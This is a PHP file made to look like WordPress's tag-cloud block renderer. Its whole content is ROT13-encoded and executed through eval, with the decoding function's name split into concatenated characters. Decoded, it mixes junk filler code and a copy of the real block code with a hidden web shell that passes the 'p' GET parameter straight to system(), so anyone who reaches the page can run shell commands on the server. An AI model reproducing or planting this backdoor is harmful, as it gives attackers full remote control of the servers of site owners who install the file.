<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/gnt-pybhq` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/gnt-pybhq` oybpx ba freire.
 *
 * @fvapr 5.2.0
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Ergheaf gur gnt pybhq sbe fryrpgrq gnkbabzl.
 */
shapgvba eraqre_oybpx_pber_gnt_pybhq( $nggevohgrf ) {
	$fznyyrfg_sbag_fvmr = $nggevohgrf['fznyyrfgSbagFvmr'];
	$havg               = ( cert_zngpu( '/^[0-9.]+(?C<havg>[n-m%]+)$/v', $fznyyrfg_sbag_fvmr, $z ) ? $z['havg'] : 'cg' );

	$netf      = neenl(
		'rpub'       => snyfr,
		'havg'       => $havg,
		'gnkbabzl'   => $nggevohgrf['gnkbabzl'],
		'fubj_pbhag' => $nggevohgrf['fubjGntPbhagf'],
		'ahzore'     => $nggevohgrf['ahzoreBsGntf'],
		'fznyyrfg'   => sybngIny( $nggevohgrf['fznyyrfgSbagFvmr'] ),
		'ynetrfg'    => sybngIny( $nggevohgrf['ynetrfgSbagFvmr'] ),
	);
	$gnt_pybhq = jc_gnt_pybhq( $netf );

	vs ( rzcgl( $gnt_pybhq ) ) {
		// Qvfcynl cynprubyqre pbagrag jura gurer ner ab gntf bayl va rqvgbe.
		vs ( jc_vf_freivat_erfg_erdhrfg() ) {
			$gnt_pybhq = __( 'Gurer&#8217;f ab pbagrag gb fubj urer lrg.' );
		} ryfr {
			erghea '';
		}
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf();

	erghea fcevags(
		'<c %1$f>%2$f</c>',
		$jenccre_nggevohgrf,
		$gnt_pybhq
	);
}

/**
 * Ertvfgref gur `pber/gnt-pybhq` oybpx ba freire.
 *
 * @fvapr 5.2.0
 */
shapgvba ertvfgre_oybpx_pber_gnt_pybhq() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/gnt-pybhq',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_gnt_pybhq',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_gnt_pybhq' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>